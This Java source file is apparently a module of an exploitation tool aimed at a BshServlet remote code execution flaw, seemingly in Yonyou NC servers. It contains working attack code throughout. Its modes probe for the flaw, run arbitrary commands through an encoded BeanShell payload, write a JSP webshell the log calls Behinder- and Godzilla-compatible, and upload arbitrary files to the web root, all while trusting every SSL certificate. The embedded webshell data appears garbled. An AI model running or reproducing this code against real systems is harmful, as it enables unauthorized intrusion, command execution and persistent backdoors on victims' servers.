package com.chave.vuln;

import com.chave.bean.Config;
import com.chave.proxy.HttpProxy;
import com.chave.utils.HttpUtil;
import com.chave.utils.SSLUtil;
import javafx.scene.control.TextArea;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class BshServlet_RCE extends VulnBase {
    public static boolean DNSLOG = false;
    public static boolean JNDI = false;
    public static boolean EXEC = true;
    public static boolean UPLOAD = true;
    public static boolean GETSHELL = true;

    public BshServlet_RCE() {
    }

    public BshServlet_RCE(TextArea log, TextArea uploadLog, TextArea execLog) {
        super(log, uploadLog, execLog);
    }

    @Override
    public void exploit() {
        String vulnerable_url = Config.TARGET + "/servlet/~ic/bsh.servlet.BshServlet";

        try {
            // 调用对应方法
            if (Config.MOD.equals("poc")) {
                if (poc(vulnerable_url, "win")) {
                    logMessage("[+] BshServlet RCE 漏洞存在!");
                } else {
                    if (poc(vulnerable_url, "linux")) {
                        logMessage("[+] BshServlet RCE 漏洞存在!");
                        return;
                    } else {
                        logMessage("[-] BshServlet RCE 漏洞不存在. 请尝试手动利用.");
                    }
                }
            } else if (Config.MOD.equals("exp")) {
                exp(vulnerable_url);
            } else if (Config.MOD.equals("exec")) {
                if (!exec(vulnerable_url, "win")) {
                    exec(vulnerable_url, "linux");
                }
            } else if (Config.MOD.equals("upload")) {
                upload(vulnerable_url);
            } else {
                throw new RuntimeException();
            }


        } catch (Exception e) {

        }
    }

    private boolean poc(String url, String system) {
        String flag = "yyds";
        try {
            // 设置全局http代理
            HttpProxy.setProxy();

            // 信任ssl证书
            SSLUtil.trustAllCertificates();

            URL apiUrl = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) apiUrl.openConnection();

            // 设置超时
            HttpUtil.setTimeout(conn);

            String shell;
            if (system.equals("win")) {
                shell = "cmd+%2fc+%5c%22";
            } else {
                shell = "sh+-c+%5c%22";
            }

            String postData = "bsh.script=e%5cu0078%5Cu0065c%28%22" + shell + "echo+yyds" + "%5c%22%22%29%3B";

            // post 请求
            HttpUtil.post(conn, postData.getBytes(StandardCharsets.UTF_8));

            int responseCode = HttpUtil.getResponseCode(conn);
            String responseText = HttpUtil.getResponseText(conn);
            if (responseCode == HttpURLConnection.HTTP_OK && responseText.contains(flag)){
                return true;
            } else {
                return false;
            }
        } catch (Exception e) {
            logMessage("[-] BshServlet RCE 漏洞不存在, 请尝试手动探测. " + e);
            return false;
        }
    }

    private boolean exec(String url, String system) {
        try {
            // 设置全局http代理
            HttpProxy.setProxy();

            // 信任ssl证书
            SSLUtil.trustAllCertificates();

            URL apiUrl = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) apiUrl.openConnection();

            // 设置超时
            HttpUtil.setTimeout(conn);

            String shell;
            if (system.equals("win")) {
                shell = "cmd+%2fc+%5c%22";
            } else {
                shell = "sh+-c+%5c%22";
            }

            String postData = "bsh.script=e%5cu0078%5Cu0065c%28%22" + shell + URLEncoder.encode(Config.CMD) + "%5c%22%22%29%3B";

            // post 请求
            HttpUtil.post(conn, postData.getBytes(StandardCharsets.UTF_8));

            int responseCode = HttpUtil.getResponseCode(conn);
            String responseText = HttpUtil.getResponseText(conn);

            String regex = "<td[^>]*>\\s*<pre>(.*?)</pre>\\s*</td>";
            Pattern pattern = Pattern.compile(regex, Pattern.DOTALL);
            Matcher matcher = pattern.matcher(responseText);
            String result = "";

            if (responseCode == HttpURLConnection.HTTP_OK && matcher.find()){
                result = matcher.group(1).trim();
                if (result.trim().isEmpty()) {
                    return false;
                } else {
                    logExec("[+] 执行成功.\n" + result);
                    return true;
                }
            } else {
                return false;
            }
        } catch (Exception e) {
            logExec("[-] 执行失败, 请尝试手动利用. " + e);
            return false;
        }
    }

    private boolean exp(String url) {
        try {
            // 设置全局http代理
            HttpProxy.setProxy();

            // 信任ssl证书
            SSLUtil.trustAllCertificates();

            URL apiUrl = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) apiUrl.openConnection();

            // 设置超时
            HttpUtil.setTimeout(conn);

            String filename = System.currentTimeMillis() + ".jsp";
            String postData = "bsh.script=import+sun.misc.BASE64Decoder%3B%0D%0A%0D%0ABASE64Decoder+decoder+%3D+new+BASE64Decoder%28%29%3B%0D%0AFileWriter+fw+%3D+new+FileWriter%28new+File%28%22.%2Fwebapps%2Fnc_web%2F" + filename + "%22%29%29%3B%0D%0AString+data+%3D+%%%%%%3D%22%3B%0D%0AString+str+%3D+new+String%28decoder.decodeBuffer%28data%29%2C+%22utf-8%22%29%3B%0D%0Afw.write%28str%29%3B%0D%0Afw.close%28%29%3B%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A";

            // post 请求
            HttpUtil.post(conn, postData.getBytes(StandardCharsets.UTF_8));

            // 处理响应
            int responseCode = HttpUtil.getResponseCode(conn);

            if (responseCode == HttpURLConnection.HTTP_OK) {
                URL secondUrl = new URL(Config.TARGET + "/" + filename);
                HttpURLConnection secondConn = (HttpURLConnection) secondUrl.openConnection();

                // 设置超时
                HttpUtil.setTimeout(secondConn);

                HttpUtil.get(secondConn);
                int responseCode2 = HttpUtil.getResponseCode(secondConn);
                String responseText2 = HttpUtil.getResponseText(secondConn);
                if (responseCode2 == HttpURLConnection.HTTP_OK && responseText2.contains(">@<")) {
                    logMessage("[+] webshell 写入成功! 同时写入回显/冰蝎/哥斯拉, 连接地址: " + Config.TARGET + "/" + filename + "\n[+] 请求头与连接密码见 README.md.");
                    return true;
                } else {
                    logMessage("[-] webshell 写入失败, 请尝试手动利用.");
                    return false;
                }
            } else {
                logMessage("[-] webshell 写入失败, 请尝试手动利用.");
                return false;
            }
        } catch (Exception e) {
            logMessage("[-] webshell 写入失败, 请尝试手动利用." + e);
            return false;
        }
    }

    private boolean upload(String url) {
        try {
            // 设置全局http代理
            HttpProxy.setProxy();

            // 信任ssl证书
            SSLUtil.trustAllCertificates();

            URL apiUrl = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) apiUrl.openConnection();

            // 设置超时
            HttpUtil.setTimeout(conn);

            String fileName = Config.FILENAME;
            byte[] fileText = Base64.getEncoder().encode(Config.FILETEXT.getBytes(StandardCharsets.UTF_8));
            String postData = "bsh.script=import+sun.misc.BASE64Decoder%3B%0D%0A%0D%0ABASE64Decoder+decoder+%3D+new+BASE64Decoder%28%29%3B%0D%0AFileWriter+fw+%3D+new+FileWriter%28new+File%28%22.%2Fwebapps%2Fnc_web%2F" + fileName + "%22%29%29%3B%0D%0AString+data+%3D+%22" + new String(fileText) + "%22%3B%0D%0AString+str+%3D+new+String%28decoder.decodeBuffer%28data%29%2C+%22utf-8%22%29%3B%0D%0Afw.write%28str%29%3B%0D%0Afw.close%28%29%3B";

            // post 请求
            HttpUtil.post(conn, postData.getBytes(StandardCharsets.UTF_8));

            // 处理响应
            int responseCode = HttpUtil.getResponseCode(conn);

            if (responseCode == HttpURLConnection.HTTP_OK) {
                URL secondUrl = new URL(Config.TARGET + "/" + fileName);
                HttpURLConnection secondConn = (HttpURLConnection) secondUrl.openConnection();

                // 设置超时
                HttpUtil.setTimeout(secondConn);

                HttpUtil.get(secondConn);
                int responseCode2 = HttpUtil.getResponseCode(secondConn);
                if (responseCode2 == HttpURLConnection.HTTP_OK) {
                    logUpload("[+] 文件上传成功! 文件地址: " + Config.TARGET + "/" + fileName);
                    return true;
                } else {
                    logUpload("[-] 文件上传失败, 请尝试手动利用.");
                    return false;
                }
            } else {
                logUpload("[-] 文件上传失败, 请尝试手动利用.");
                return false;
            }
        } catch (Exception e) {
            logUpload("[-] 文件上传失败, 请尝试手动利用." + e);
            return false;
        }
    }
}
